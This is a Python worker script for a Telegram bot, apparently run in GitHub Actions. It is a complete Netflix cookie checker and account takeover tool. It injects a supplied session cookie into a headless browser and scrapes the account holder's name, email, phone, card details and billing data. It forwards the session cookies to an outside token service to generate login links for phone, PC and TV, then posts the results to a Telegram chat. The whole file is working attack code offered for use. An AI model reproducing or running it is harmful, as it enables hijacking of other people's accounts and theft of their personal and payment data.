#!/usr/bin/env python3
"""
Worker script that runs in GitHub Actions.
Performs Netflix check and sends the result back to Telegram with full UI.
"""

import os
import re
import json
import time
import urllib.parse
from datetime import datetime, timedelta

import requests
from playwright.sync_api import sync_playwright
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# ========== Configuration ==========
NFTOKEN_API = "https://nftoken.onrender.com/api/check-single-batch"
TV_API = "https://netflixtvloginapi.onrender.com"
TV_WEBSITE = "https://netflixtvloginapi.onrender.com"
OWNER = "@ANUJXKING"

# ========== Cookie helpers ==========
def extract_netflix_id(text: str):
    m = re.search(r"NetflixId=([^\s\n;,]+)", text)
    if m:
        return m.group(1).strip()
    s = text.strip()
    if re.match(r"^v(%3D|%3d|=3)", s):
        return s
    return None

def extract_all_netflix_ids(text: str) -> list:
    return list(dict.fromkeys(re.findall(r"NetflixId=([^\s\n;,]+)", text)))

# ========== Netflix page JS extractors ==========
_BROWSE_JS = """() => {
    try {
        const m = window.netflix?.reactContext?.models || {};
        const u  = m.userInfo?.data || {};
        let profiles = [];
        try {
            const pl = m.profilesList?.data?.profiles || [];
            profiles = pl.map(p => p.profileName || p.name || '').filter(Boolean);
        } catch(_) {}
        return {
            name:             u.accountOwnerName || u.name || u.userFullName || '',
            guid:             u.guid || '',
            country:          u.currentCountry || u.countryOfSignup || '',
            membershipStatus: u.membershipStatus || '',
            memberSince:      u.memberSince || '',
            numProfiles:      u.numProfiles || profiles.length || 0,
            numKidsProfiles:  u.numKidsProfiles || 0,
            profiles:         profiles,
            authURL:          u.authURL || '',
            isTestAccount:    u.isTestAccount || false,
        };
    } catch(e) { return {error: e.toString()}; }
}"""

_ACCOUNT_JS = """() => {
    try {
        const m = window.netflix?.reactContext?.models || {};
        const ai = m.accountInfo?.data || {};
        return {
            email:         ai.email || ai.emailAddress || '',
            phone:         ai.phoneNumber || '',
            emailVerified: ai.emailVerified,
            phoneVerified: ai.phoneVerified,
        };
    } catch(e) { return {}; }
}"""

def _parse_account_text(body: str) -> dict:
    result = {}
    m = re.search(r"([\w\s]+?)\s*plan\b", body, re.IGNORECASE)
    if m:
        result["plan"] = m.group(1).strip().title()
    m = re.search(r"Next payment(?:\s*date)?[:\s]+([A-Z][a-z]+ \d+,\s*\d{4})", body)
    if m:
        result["nextBillingDate"] = m.group(1).strip()
    m = re.search(r"Member since\s+([A-Z][a-z]+ \d{4})", body)
    if m:
        result["memberSince"] = m.group(1).strip()
    m = re.search(r"[•*]{4}\s+[•*]{4}\s+[•*]{4}\s+(\d{4})", body)
    if m:
        result["cardLast4"] = m.group(1)
    else:
        m = re.search(r"ending in\s+(\d{4})", body, re.IGNORECASE)
        if m:
            result["cardLast4"] = m.group(1)
    for brand in ["Visa", "Mastercard", "American Express", "Discover", "PayPal"]:
        if brand.lower() in body.lower():
            result["cardBrand"] = brand
            break
    if "paypal" in body.lower():
        result["paymentType"] = "PayPal"
    elif any(b in body.lower() for b in ["visa", "mastercard", "card", "credit", "debit"]):
        result["paymentType"] = "CC"
    m = re.search(r"(\d+)\s+streams?", body, re.IGNORECASE)
    if m:
        result["maxStreams"] = m.group(1)
    m = re.search(r"(?:US)?\$(\d+\.\d{2})", body)
    if m:
        result["price"] = "$" + m.group(1)
    if "on hold" in body.lower() or "account hold" in body.lower():
        result["holdStatus"] = "Yes"
    else:
        result["holdStatus"] = "No"
    if "extra member" in body.lower():
        result["extraMember"] = "Yes"
    else:
        result["extraMember"] = "No"
    m = re.search(r"(\d+)\s+profiles?", body, re.IGNORECASE)
    if m:
        result["numProfiles"] = m.group(1)
    return result

# ========== Core: full info ==========
def generate_full_info(netflix_id: str) -> tuple:
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"],
            )
            ctx = browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            ctx.add_cookies(
                [
                    {
                        "name": "NetflixId",
                        "value": netflix_id,
                        "domain": ".netflix.com",
                        "path": "/",
                        "secure": True,
                        "httpOnly": False,
                    }
                ]
            )
            page = ctx.new_page()

            page.goto(
                "https://www.netflix.com/browse",
                wait_until="networkidle",
                timeout=60000,
            )
            page.wait_for_timeout(3000)

            final_url = page.url
            browse_info = page.evaluate(_BROWSE_JS)

            all_cookies = ctx.cookies(["https://www.netflix.com"])
            cookie_dict = {c["name"]: c["value"] for c in all_cookies}

            if "SecureNetflixId" not in cookie_dict:
                browser.close()
                return False, {
                    "error": "Cookie is invalid or expired — Netflix rejected it."
                }

            try:
                page.goto(
                    "https://www.netflix.com/account",
                    wait_until="networkidle",
                    timeout=30000,
                )
                page.wait_for_timeout(2000)
                account_body = page.inner_text("body") or ""
                account_js = page.evaluate(_ACCOUNT_JS)
            except Exception as e:
                account_body = ""
                account_js = {}

            browser.close()

        acct_parsed = _parse_account_text(account_body)

        payload = {
            "cookieDict": {
                "NetflixId": cookie_dict.get("NetflixId", netflix_id),
                "SecureNetflixId": cookie_dict["SecureNetflixId"],
                "nfvdid": cookie_dict.get("nfvdid", ""),
            },
            "id": 1,
            "source": "cookie-header",
        }
        resp = requests.post(NFTOKEN_API, json=payload, timeout=60)
        api_data = resp.json()

        if not api_data.get("success"):
            return False, {"error": api_data.get("error", "Token API failed.")}

        token = api_data.get("token", "")
        if not token:
            return False, {"error": "No token returned from API."}

        enc = urllib.parse.quote(token, safe="")
        pc_link = f"https://www.netflix.com/browse?nftoken={enc}"
        android_link = f"https://www.netflix.com/unsupported?nftoken={enc}"

        generated_at = datetime.utcnow()
        expires_at = generated_at + timedelta(hours=1)

        info = {
            "name": browse_info.get("name", ""),
            "country": browse_info.get("country", ""),
            "membershipStatus": browse_info.get("membershipStatus", ""),
            "memberSince": browse_info.get("memberSince", "") or acct_parsed.get("memberSince", ""),
            "numProfiles": browse_info.get("numProfiles", ""),
            "profiles": browse_info.get("profiles", []),
            "plan": acct_parsed.get("plan", ""),
            "nextBillingDate": acct_parsed.get("nextBillingDate", ""),
            "cardLast4": acct_parsed.get("cardLast4", ""),
            "cardBrand": acct_parsed.get("cardBrand", ""),
            "paymentType": acct_parsed.get("paymentType", "CC"),
            "holdStatus": acct_parsed.get("holdStatus", "No"),
            "extraMember": acct_parsed.get("extraMember", "No"),
            "price": acct_parsed.get("price", ""),
            "email": account_js.get("email", ""),
            "phone": account_js.get("phone", ""),
            "emailVerified": account_js.get("emailVerified", ""),
            "phoneVerified": account_js.get("phoneVerified", ""),
            "generatedAt": generated_at.strftime("%Y-%m-%d %H:%M:%S"),
            "expiresAt": expires_at.strftime("%Y-%m-%d %H:%M:%S"),
        }

        return True, {
            "info": info,
            "cookies": cookie_dict,
            "pc_link": pc_link,
            "android_link": android_link,
            "token": token,
            "netflix_id": netflix_id,
        }

    except Exception as e:
        return False, {"error": str(e)[:400]}

# ========== Core: token only ==========
def generate_token_only(netflix_id: str) -> tuple:
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"],
            )
            ctx = browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            ctx.add_cookies(
                [
                    {
                        "name": "NetflixId",
                        "value": netflix_id,
                        "domain": ".netflix.com",
                        "path": "/",
                        "secure": True,
                        "httpOnly": False,
                    }
                ]
            )
            page = ctx.new_page()
            page.goto(
                "https://www.netflix.com/browse",
                wait_until="networkidle",
                timeout=60000,
            )
            page.wait_for_timeout(3000)
            all_cookies = ctx.cookies(["https://www.netflix.com"])
            cookie_dict = {c["name"]: c["value"] for c in all_cookies}
            browser.close()

        if "SecureNetflixId" not in cookie_dict:
            return False, "Cookie invalid or expired."

        payload = {
            "cookieDict": {
                "NetflixId": cookie_dict.get("NetflixId", netflix_id),
                "SecureNetflixId": cookie_dict["SecureNetflixId"],
                "nfvdid": cookie_dict.get("nfvdid", ""),
            },
            "id": 1,
            "source": "cookie-header",
        }
        data = requests.post(NFTOKEN_API, json=payload, timeout=60).json()
        if not data.get("success"):
            return False, data.get("error", "Token API failed.")

        token = data.get("token", "")
        if not token:
            return False, "No token returned."

        enc = urllib.parse.quote(token, safe="")
        return True, {
            "pc_link": f"https://www.netflix.com/browse?nftoken={enc}",
            "android_link": f"https://www.netflix.com/unsupported?nftoken={enc}",
            "token": token,
            "cookies": cookie_dict,
        }
    except Exception as e:
        return False, str(e)[:400]

# ========== TV login helpers (unchanged) ==========
def tv_extract_cookie(netflix_id: str) -> tuple:
    try:
        r = requests.post(
            f"{TV_API}/api/extract",
            json={"content": f"NetflixId={netflix_id}"},
            headers={"Content-Type": "application/json"},
            timeout=20,
        )
        data = r.json()
        if data.get("success") and data.get("netflix_ids"):
            return True, data["netflix_ids"][0]
        return False, data.get("error", "TV extract failed")
    except Exception as e:
        return False, str(e)

def tv_perform_login(encrypted_id: str, tv_code: str) -> tuple:
    try:
        r = requests.post(
            f"{TV_API}/api/login",
            json={"encrypted_id": encrypted_id, "tv_code": tv_code, "session_id": ""},
            headers={"Content-Type": "application/json"},
            timeout=30,
        )
        data = r.json()
        if data.get("success"):
            return True, data.get("message", "Login successful!")
        return False, data.get("message") or data.get("error") or "Login failed"
    except Exception as e:
        return False, str(e)

# ========== Message formatter ==========
COUNTRY_NAMES = {
    "US": "United States 🇺🇸",
    "GB": "United Kingdom 🇬🇧",
    "IN": "India 🇮🇳",
    "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺",
    "DE": "Germany 🇩🇪",
    "FR": "France 🇫🇷",
    "BR": "Brazil 🇧🇷",
    "MX": "Mexico 🇲🇽",
    "JP": "Japan 🇯🇵",
    "KR": "South Korea 🇰🇷",
    "NL": "Netherlands 🇳🇱",
    "IT": "Italy 🇮🇹",
    "ES": "Spain 🇪🇸",
    "PK": "Pakistan 🇵🇰",
    "BD": "Bangladesh 🇧🇩",
    "NG": "Nigeria 🇳🇬",
    "ZA": "South Africa 🇿🇦",
    "TR": "Turkey 🇹🇷",
    "AR": "Argentina 🇦🇷",
}

def build_account_card(info: dict, pc_link: str, android_link: str) -> str:
    i = info or {}
    country_code = _v(i.get("country"), "")
    country_disp = COUNTRY_NAMES.get(country_code.upper(), country_code) if country_code else "N/A"
    profiles_list = i.get("profiles", [])
    profiles_str = ", ".join(str(x) for x in profiles_list if x) if profiles_list else "N/A"
    num_profiles = _v(i.get("numProfiles"), "")
    if not num_profiles or num_profiles == "N/A":
        num_profiles = str(len(profiles_list)) if profiles_list else "N/A"
    membership = _v(i.get("membershipStatus"), "UNKNOWN").upper()
    is_active = any(k in membership for k in ("CURRENT", "ACTIVE", "MEMBER"))
    badge = "✅" if is_active else "❌"
    card_last4 = _v(i.get("cardLast4"), "")
    card_brand = _v(i.get("cardBrand"), "")
    card_disp = (
        f"{card_brand} •••• {card_last4}"
        if (card_last4 and card_brand)
        else (f"•••• {card_last4}" if card_last4 else "N/A")
    )
    phone = _v(i.get("phone"), "")
    phone_ver = i.get("phoneVerified")
    phone_disp = f"{phone} (Yes)" if (phone and phone_ver) else (f"{phone} (No)" if phone else "N/A")
    email_ver = i.get("emailVerified")
    ev_disp = "Yes" if email_ver is True else ("No" if email_ver is False else "N/A")
    plan = _v(i.get("plan"), "Premium")
    if "4k" in plan.lower() or "ultra" in plan.lower():
        quality = "UHD (4K)"
        streams = "4"
    elif "standard" in plan.lower() and "ads" in plan.lower():
        quality = "Full HD (1080p)"
        streams = "2"
    elif "standard" in plan.lower():
        quality = "Full HD (1080p)"
        streams = "2"
    elif "basic" in plan.lower():
        quality = "HD (720p)"
        streams = "1"
    else:
        quality = "UHD (4K)"
        streams = "4"
    gen_at = _v(i.get("generatedAt"), datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"))
    exp_at = _v(i.get("expiresAt"), "")
    remaining = "0d 0h 59m 0s"
    return (
        "🌟 *PREMIUM ACCOUNT DETAILS* 🌟\n\n"
        f"{badge} *Status:* Valid Premium Account\n\n"
        "👤 *Account Details:*\n"
        f"• Name: `{_v(i.get('name'))}`\n"
        f"• Email: `{_v(i.get('email'))}`\n"
        f"• Country: `{country_disp}`\n"
        f"• Plan: `{plan}`\n"
        f"• Price: `{_v(i.get('price'))}`\n"
        f"• Member Since: `{_v(i.get('memberSince'))}`\n"
        f"• Next Billing: `{_v(i.get('nextBillingDate'))}`\n"
        f"• Payment: `{_v(i.get('paymentType'), 'CC')}`\n"
        f"• Card: `{card_disp}`\n"
        f"• Phone: `{phone_disp}`\n"
        f"• Quality: `{quality}`\n"
        f"• Streams: `{streams}`\n"
        f"• Hold Status: `{_v(i.get('holdStatus'), 'No')}`\n"
        f"• Extra Member: `{_v(i.get('extraMember'), 'No')}`\n"
        f"• Extra Member Slot: `Unknown`\n"
        f"• Email Verified: `{ev_disp}`\n"
        f"• Membership Status: `{membership}`\n"
        f"• Connected Profiles: `{num_profiles}`\n"
        f"• Profiles: `{profiles_str}`\n\n"
        "🔑 *Token Information:*\n"
        f"• Generated: `{gen_at}`\n"
        f"• Expires: `{exp_at}`\n"
        f"• Remaining: `{remaining}`\n\n"
        f"📱 [Phone Login]({android_link})    🖥️ [PC Login]({pc_link})\n\n"
        "🍪 *Source:* Cookie Input\n"
        f"🎯 *Mode:* Full Information\n\n"
        f"👑 *Bot Owner:* {OWNER}"
    )

def _v(val, fallback="N/A"):
    if val is not None and str(val).strip() not in ("", "None", "null", "0", "False"):
        return str(val).strip()
    return fallback

# ========== Telegram sender with inline keyboard ==========
def send_telegram_message(chat_id: str, text: str, parse_mode='Markdown', reply_markup=None):
    token = os.environ.get('BOT_TOKEN')
    if not token:
        print("BOT_TOKEN environment variable not set")
        return
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode,
        'disable_web_page_preview': True
    }
    if reply_markup:
        if hasattr(reply_markup, 'to_json'):
            payload['reply_markup'] = reply_markup.to_json()
        else:
            payload['reply_markup'] = reply_markup
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Failed to send message: {e}")

def make_inline_keyboard(pc_link, android_link, tv_website):
    keyboard = [
        [
            InlineKeyboardButton("📱 Phone Login", url=android_link),
            InlineKeyboardButton("🖥️ PC Login", url=pc_link)
        ],
        [
            InlineKeyboardButton("📺 TV Login Code", url=tv_website)
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== Main ==========
def main():
    cookie = os.environ.get('COOKIE')
    chat_id = os.environ.get('CHAT_ID')
    command = os.environ.get('COMMAND', 'full')

    if not cookie or not chat_id:
        print("Missing required environment variables")
        return

    send_telegram_message(chat_id, "⚡ *Processing your request...*", parse_mode='Markdown')

    if command == 'token':
        success, result = generate_token_only(cookie)
        if success:
            text = (
                "🌟 *Token Generated* 🌟\n\n"
                f"✅ *Status:* Valid\n\n"
                f"📱 [Phone Login]({result['android_link']})\n"
                f"🖥️ [PC Login]({result['pc_link']})\n\n"
                f"💡 _Use /chk for full account details!_\n\n"
                f"👑 *Owner:* {OWNER}"
            )
            send_telegram_message(chat_id, text)
        else:
            send_telegram_message(chat_id, f"❌ *Error:* {result}")
    else:
        success, data = generate_full_info(cookie)
        if success:
            card = build_account_card(data['info'], data['pc_link'], data['android_link'])
            keyboard = make_inline_keyboard(data['pc_link'], data['android_link'], TV_WEBSITE)
            send_telegram_message(chat_id, card, reply_markup=keyboard)
        else:
            send_telegram_message(chat_id, f"❌ *Cookie Invalid!*\n\n`{data.get('error', 'Unknown error')}`")

if __name__ == '__main__':
    main()
